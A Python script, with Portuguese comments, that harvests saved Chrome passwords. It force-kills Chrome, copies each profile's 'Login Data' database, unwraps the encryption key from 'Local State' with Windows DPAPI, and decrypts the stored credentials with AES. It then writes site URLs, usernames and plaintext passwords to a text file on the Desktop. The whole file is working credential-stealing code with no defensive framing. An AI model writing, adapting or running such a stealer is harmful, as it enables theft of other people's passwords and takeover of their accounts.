import sqlite3
import base64
import json
import os
import time
import shutil
from Crypto.Cipher import AES
import win32crypt
import psutil
import ctypes

def get_desktop_path():
    """Detecta a pasta 'Desktop' no sistema."""
    csidl_desktop = 0x0010
    buf = ctypes.create_unicode_buffer(260)
    ctypes.windll.shell32.SHGetFolderPathW(0, csidl_desktop, 0, 0, buf)
    return buf.value

OUTPUT_FILE_PATH = os.path.join(get_desktop_path(), "urlsloginsesenhas.txt")
TEMP_DB_FILE = "temp_ChromePasswords.db"

def get_key(keypath):
    """Obtém a chave de criptografia do arquivo 'Local State' do Chrome."""
    print(f"[INFO] Obtendo a chave de criptografia do arquivo '{keypath}'")
    try:
        if not os.path.exists(keypath):
            raise FileNotFoundError(f"O arquivo '{keypath}' não foi encontrado.")
        
        with open(keypath, "r", encoding="utf-8") as f:
            local_state_data = json.load(f)
        
        encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        encryption_key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]

        if encryption_key:
            print("[INFO] Chave de criptografia obtida com sucesso.")
            return encryption_key
        else:
            raise ValueError("Chave de criptografia não encontrada.")
    except FileNotFoundError as fnf_error:
        print(f"[ERROR] {fnf_error}")
    except json.JSONDecodeError as json_error:
        print(f"[ERROR] Erro ao decodificar JSON: {json_error}")
    except Exception as e:
        print(f"[ERROR] Erro ao obter a chave: {e}")
    return None

def password_decryption(password, encryption_key):
    """Descriptografa a senha usando a chave fornecida."""
    print("[INFO] Descriptografando a senha")
    try:
        # Tenta AES GCM primeiro
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        print(f"[INFO] Falha com AES GCM: {e}")
        try:
            # Tenta AES CBC em seguida
            iv = password[:16]
            cipher = AES.new(encryption_key, AES.MODE_CBC, iv)
            decrypted_password = cipher.decrypt(password[16:])
            return decrypted_password.rstrip(b"\x00").decode()
        except Exception as e:
            print(f"[INFO] Falha com AES CBC: {e}")
            try:
                # Tenta Windows Data Protection API (DPAPI) por último
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except Exception as e:
                print(f"[ERROR] Erro na descriptografia alternativa: {e}")
    return "Sem senhas"

def close_chrome():
    """Força o fechamento de todos os processos do Chrome."""
    print("[INFO] Forçando o fechamento dos processos do Chrome")
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'chrome.exe':
            try:
                proc.kill()
                print(f"[INFO] Processo {proc.info['pid']} encerrado.")
            except psutil.NoSuchProcess:
                print(f"[WARNING] Processo {proc.info['pid']} não encontrado.")
            except psutil.AccessDenied:
                print(f"[ERROR] Acesso negado ao processo {proc.info['pid']}.")

def remove_temp_file():
    """Remove o arquivo temporário com várias tentativas se necessário."""
    print("[INFO] Removendo o arquivo temporário")
    attempts = 0
    while attempts < 5:
        try:
            if os.path.exists(TEMP_DB_FILE):
                os.remove(TEMP_DB_FILE)
                print("[INFO] Arquivo temporário removido com sucesso.")
            break
        except Exception as e:
            print(f"[ERROR] Erro ao remover arquivo temporário na tentativa {attempts+1}: {e}")
            attempts += 1
            time.sleep(2)

def get_credentials(dbpath, keypath):
    """Extrai credenciais do banco de dados e escreve em um arquivo txt."""
    print(f"[INFO] Extraindo credenciais do banco de dados '{dbpath}'")
    credentials_found = False
    collected_info = []
    try:
        if not os.path.exists(dbpath):
            raise FileNotFoundError(f"O arquivo do banco de dados '{dbpath}' não foi encontrado.")
        
        close_chrome()
        time.sleep(5)
        
        if os.path.exists(TEMP_DB_FILE):
            os.remove(TEMP_DB_FILE)
        shutil.copyfile(dbpath, TEMP_DB_FILE)
        time.sleep(5)
        
        encryption_key = get_key(keypath)
        if not encryption_key:
            raise ValueError("Não foi possível obter a chave de criptografia.")
        
        with sqlite3.connect(TEMP_DB_FILE) as db:
            cursor = db.cursor()
            cursor.execute("PRAGMA busy_timeout = 5000;")
            cursor.execute(
                "SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_last_used"
            )
            for row in cursor.fetchall():
                main_url, login_page_url, user_name, password, date_created, last_used = row
                decrypted_password = password_decryption(password, encryption_key)
                if user_name or decrypted_password:
                    credentials_found = True
                    info = (f"URL Principal: {main_url}, URL de Login: {login_page_url}, "
                            f"Nome de usuário: {user_name}, Senha descriptografada: {decrypted_password}\n")
                    collected_info.append(info)
            cursor.close()
    except FileNotFoundError as fnf_error:
        print(f"[ERROR] {fnf_error}")
    except sqlite3.OperationalError as sql_error:
        print(f"[ERROR] Erro operacional do SQLite: {sql_error}")
    except Exception as e:
        print(f"[ERROR] Erro inesperado: {e}")
    finally:
        remove_temp_file()
    
    if not credentials_found:
        return ["Nenhuma senha ou login encontrado.\n"]
    return collected_info

def process_profiles():
    """Processa todos os perfis do Chrome para extrair credenciais."""
    print("[INFO] Iniciando o processamento dos perfis do Chrome")
    root_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    if not os.path.exists(root_path):
        print(f"[ERROR] O diretório '{root_path}' não foi encontrado.")
        return
    
    profiles = [name for name in os.listdir(root_path) if os.path.isdir(os.path.join(root_path, name))]
    for profile in profiles:
        profile_path = os.path.join(root_path, profile)
        dbpath = os.path.join(profile_path, "Default", "Login Data")
        keypath = os.path.join(profile_path, "Local State")
        if os.path.exists(dbpath) and os.path.exists(keypath):
            print(f"[INFO] Processando perfil: {profile}")
            credentials = get_credentials(dbpath, keypath)
            with open(OUTPUT_FILE_PATH, "a", encoding="utf-8") as f:
                f.writelines(credentials)
        else:
            print(f"[WARNING] Arquivos necessários não encontrados para o perfil: {profile}")

if __name__ == "__main__":
    process_profiles()

